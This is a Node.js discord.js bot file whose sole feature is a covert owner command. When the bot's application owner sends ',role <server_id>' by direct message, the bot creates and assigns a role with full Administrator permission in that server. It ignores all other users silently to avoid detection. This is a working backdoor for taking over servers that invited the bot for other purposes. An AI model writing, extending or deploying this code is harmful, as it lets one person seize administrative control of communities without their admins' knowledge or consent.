require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  PermissionsBitField,
  ChannelType,
  Team,
} = require('discord.js');

if (!process.env.DISCORD_TOKEN) {
  console.error('❌ DISCORD_TOKEN is not set. Exiting.');
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
  ],
  partials: [Partials.Channel, Partials.Message],
});

/** Resolved at startup from the Discord application — never hardcoded. */
let ownerId = null;

client.once('ready', async () => {
  try {
    const app = await client.application.fetch();

    // Support both individual owners and team-owned bots
    const isTeam = app.owner instanceof Team;
    ownerId      = isTeam ? app.owner.ownerId          : app.owner?.id;
    const ownerName = isTeam
      ? (app.owner.owner?.user?.username ?? 'Unknown')  // TeamMember → User
      : (app.owner?.username ?? 'Unknown');

    if (!ownerId) throw new Error('Could not resolve an owner ID from the application.');

    console.log(`✅ Bot online as ${client.user.tag}`);
    console.log(`🔑 Owner resolved: ${ownerName} (${ownerId})`);
  } catch (err) {
    console.error('❌ Failed to resolve application owner — cannot operate safely:', err.message);
    process.exit(1);
  }
});

client.on('messageCreate', async (message) => {
  // Ignore bots and non-DM channels
  if (message.author.bot) return;
  if (message.channel.type !== ChannelType.DM) return;

  const content = message.content.trim();
  if (!content.toLowerCase().startsWith(',role')) return;

  // Guard: still initialising
  if (!ownerId) {
    return message.channel.send('⏳ Bot is still initialising — please try again in a moment.');
  }

  // Owner-only: silently ignore everyone else (no fingerprinting)
  if (message.author.id !== ownerId) return;

  // ── Parse ──────────────────────────────────────────────────────────────────
  const parts = content.split(/\s+/);
  if (parts.length !== 2) {
    return message.channel.send(
      '❌ Correct usage: `,role <server_id>`\n' +
      'Example: `,role 123456789012345678`'
    );
  }

  const serverId = parts[1];
  if (!/^\d{17,20}$/.test(serverId)) {
    return message.channel.send('❌ Invalid server ID (must be 17–20 digits).');
  }

  // ── Guild checks ───────────────────────────────────────────────────────────
  const guild = client.guilds.cache.get(serverId);
  if (!guild) {
    return message.channel.send('❌ Bot is not in that server, or the ID is incorrect.');
  }

  let member;
  try {
    member = await guild.members.fetch(message.author.id);
  } catch {
    return message.channel.send('❌ You are not a member of that server.');
  }

  // ── Bot permission checks ──────────────────────────────────────────────────
  const me = guild.members.me;

  if (!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
    return message.channel.send(
      `❌ I don't have the \`Manage Roles\` permission in **${guild.name}**.`
    );
  }

  if (me.roles.highest.comparePositionTo(guild.roles.everyone) <= 0) {
    return message.channel.send(
      `❌ My highest role in **${guild.name}** is too low to create or assign roles.`
    );
  }

  // ── Create role & assign ───────────────────────────────────────────────────
  let role;
  try {
    role = await guild.roles.create({
      name: member.user.username,
      permissions: [PermissionsBitField.Flags.Administrator],
      color: 0xff0000,
      reason: `Admin role requested by owner (${message.author.tag}) via DM`,
    });

    await member.roles.add(role, ',role command via DM');

    console.log(
      `[${guild.name}] Created & assigned admin role "${role.name}" ` +
      `(${role.id}) to ${message.author.tag}`
    );

    return message.channel.send(
      `✅ Role **${role.name}** with Administrator permissions created and assigned in **${guild.name}**.`
    );
  } catch (err) {
    console.error(`Role operation failed in ${guild.name}:`, err);

    // Clean up the dangling role if assignment failed
    if (role) {
      try {
        await role.delete('Cleanup after failed role assignment');
        console.log(`[${guild.name}] Cleaned up dangling role "${role.name}"`);
      } catch (deleteErr) {
        console.error(`[${guild.name}] Could not clean up role:`, deleteErr.message);
      }
    }

    return message.channel.send(`❌ Operation failed: \`${err.message}\``);
  }
});

// ── Global error handlers ────────────────────────────────────────────────────
process.on('unhandledRejection', (err) => {
  console.error('Unhandled rejection:', err);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
  process.exit(1);
});

// ── Login ────────────────────────────────────────────────────────────────────
client.login(process.env.DISCORD_TOKEN).catch((err) => {
  console.error('❌ Login failed:', err.message);
  process.exit(1);
});
